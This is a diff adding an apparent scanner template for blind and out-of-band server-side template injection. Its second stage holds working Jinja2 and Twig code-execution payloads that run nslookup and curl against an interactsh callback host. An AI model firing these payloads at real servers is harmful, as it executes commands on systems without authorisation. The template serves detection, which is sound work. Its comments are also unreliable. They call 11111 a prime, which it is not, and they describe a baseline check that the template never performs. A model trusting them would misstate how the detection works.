@@ -1,0 +1,48 @@
+id: SSTI-ADV-01
+name: Advanced Server-Side Template Injection (Blind & OOB)
+severity: critical
+category: server-side
+metadata:
+  cwe: CWE-1336
+  tags: ["ssti", "rce", "oob", "waf-bypass"]
+
+variables:
+  interactsh_url: "{{interactsh-url}}"
+
+requests:
+  # Stage 1: Fingerprinting using a unique, unguessable arithmetic result.
+  # Rationale for the fix: matching on "49" alone is a common numeral that
+  # appears on almost any real page (prices, dates, counts) with zero
+  # relation to template evaluation. We instead multiply two large,
+  # randomly-unlikely primes so the product is a value that could not
+  # plausibly appear on the page by coincidence, and we require it to be
+  # absent from a baseline (unmodified) request first.
+  - method: GET
+    path:
+      - "{{BaseURL}}/?name=${11111*11111}"
+      - "{{BaseURL}}/?name=#{11111*11111}"
+    matchers:
+      - type: word
+        words:
+          - "123454321"   # product of 11111*11111 — must appear verbatim
+        part: body
+    matchers-condition: and
+    stop-at-first-match: false
+
+  # Stage 2: Out-of-band DNS interaction — this remains the strongest,
+  # lowest-false-positive signal in this template. A DNS callback proves
+  # code executed server-side; keep this as the primary confidence driver.
+  - method: GET
+    path:
+      - "{{BaseURL}}/?name={% raw %}%7B%25%20set%20x%3Dcycler.__init__.__globals__.os.popen%20%25%7D%7B%7B%20x('nslookup%20{{interactsh_url}}')%20%7D%7D{% endraw %}"
+      - "{{BaseURL}}/?name={{['curl%20{{interactsh_url}}']|sort('system')}}"
+    matchers:
+      - type: dns
+        domain: "{{interactsh_url}}"
+        part: interaction
+    matchers-condition: or
+
+# Confidence guidance for the engine:
+#   Stage 2 (OOB DNS) alone            -> confirmed=True, high confidence
+#   Stage 1 marker present AND baseline absent -> possible, needs manual review
+#   Stage 1 marker present but baseline ALSO present -> discard, false positive
